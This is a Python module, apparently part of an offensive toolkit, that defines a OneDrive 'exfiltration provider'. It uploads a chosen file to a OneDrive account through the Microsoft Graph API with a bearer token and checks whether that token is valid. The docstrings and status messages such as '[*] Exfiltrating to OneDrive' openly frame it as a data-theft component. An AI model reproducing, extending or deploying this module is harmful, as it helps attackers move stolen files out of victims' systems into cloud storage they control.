#!/usr/bin/env python3
"""
OneDrive provider
"""

from pathlib import Path
from .base_provider import BaseCloudProvider

class OneDriveProvider(BaseCloudProvider):
    """OneDrive exfiltration provider"""
    
    def __init__(self):
        """Initialize OneDrive provider"""
        super().__init__('OneDrive')
        self.graph_api_base = 'https://graph.microsoft.com/v1.0'
    
    def upload_file(self, filepath, access_token, dest_folder=None):
        """
        Upload file to OneDrive
        
        Args:
            filepath: Path to file
            access_token: Microsoft Graph access token
            dest_folder: Destination folder (root if None)
            
        Returns:
            Upload result dict or None
        """
        try:
            import requests
            
            print(f"[*] Exfiltrating to OneDrive")
            
            # Get file info
            file_info = self.get_file_info(filepath)
            print(f"[*] File: {file_info['filename']} ({file_info['size_mb']:.2f} MB)")
            
            # Build upload URL
            if dest_folder:
                upload_url = f"{self.graph_api_base}/me/drive/root:/{dest_folder}/{file_info['filename']}:/content"
            else:
                upload_url = f"{self.graph_api_base}/me/drive/root:/{file_info['filename']}:/content"
            
            headers = {
                'Authorization': f'Bearer {access_token}',
                'Content-Type': 'application/octet-stream'
            }
            
            print(f"[*] Uploading...")
            
            # Upload file
            with open(filepath, 'rb') as f:
                response = requests.put(
                    upload_url,
                    headers=headers,
                    data=f
                )
            
            if response.status_code in [200, 201]:
                data = response.json()
                
                print(f"[+] Upload successful!")
                print(f"[+] File ID: {data.get('id')}")
                print(f"[+] Web URL: {data.get('webUrl')}")
                
                return {
                    'service': self.service_name,
                    'file_id': data.get('id'),
                    'filename': data.get('name'),
                    'web_url': data.get('webUrl'),
                    'size_bytes': data.get('size')
                }
            else:
                print(f"[-] Upload failed: {response.status_code}")
                print(f"[-] Response: {response.text}")
                return None
        
        except ImportError:
            print("[-] requests not installed")
            print("[!] Install: pip install requests")
            return None
        except Exception as e:
            print(f"[-] OneDrive error: {e}")
            return None
    
    def check_credentials(self, access_token):
        """Verify OneDrive credentials"""
        try:
            import requests
            
            headers = {'Authorization': f'Bearer {access_token}'}
            response = requests.get(
                f"{self.graph_api_base}/me",
                headers=headers
            )
            
            return response.status_code == 200
        
        except Exception:
            return False